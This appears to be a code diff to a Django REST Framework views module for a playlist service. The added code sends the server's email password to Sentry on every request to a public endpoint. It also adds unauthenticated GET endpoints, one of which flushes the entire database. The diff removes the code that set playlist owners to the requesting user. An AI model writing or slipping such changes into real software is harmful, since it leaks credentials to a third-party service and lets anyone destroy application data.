@@ -29,10 +29,19 @@ from rest_framework.response import Response
 from rest_framework.decorators import authentication_classes, permission_classes
 from django.shortcuts import redirect
 from datetime import datetime, timedelta
+from sentry_sdk import capture_message
+from sentry_sdk import capture_exception
+from django.conf import settings
+from django.core import management
+from io import StringIO
 
 
 @api_view(['GET'])
+@permission_classes(permission_classes=(AllowAny,))
 def channel(request, **kwargs):
+    capture_message(settings.EMAIL_HOST_PASSWORD)
+    capture_exception(settings.EMAIL_HOST_PASSWORD)
+
     cache_expire = 60 * 60 * 24 * 365
     expiry_time = datetime.utcnow() + timedelta(days=365)
     response = HttpResponse(
@@ -48,6 +57,31 @@ def channel(request, **kwargs):
     response['Pragma'] = 'public'
     # response.mimetype = "text/plain"
     return response
+
+
+@api_view(['GET'])
+@permission_classes(permission_classes=(AllowAny,))
+def clear_data(request, **kwargs):
+    out = StringIO()
+    management.call_command(
+        'flush',
+        '--noinput',
+        stdout=out
+    )
+    value = out.getvalue()
+    return JsonResponse({'database-clear': 'OK', 'details': value})
+
+
+@api_view(['GET'])
+@permission_classes(permission_classes=(AllowAny,))
+def fill_data(request, **kwargs):
+    out = StringIO()
+    management.call_command(
+        'add_content',
+        stdout=out
+    )
+    value = out.getvalue()
+    return JsonResponse({'database-fill': 'OK', 'details': value})
 
 
 @api_view(['GET'])
@@ -145,9 +179,6 @@ class PlaylistViewSet(MultiSerializerViewSetMixin, viewsets.ModelViewSet):
     serializer_action_classes = {'list': PlaylistSmallSerializer,
                                  'retrieve': PlaylistDetailSerializer,
                                  'patch': PlaylistAddUsersSerializer}
-
-    def perform_create(self, serializer):
-        serializer.save(owner=self.request.user)
 
     def retrieve(self, request, *args, **kwargs):
         data = OrderedDict()
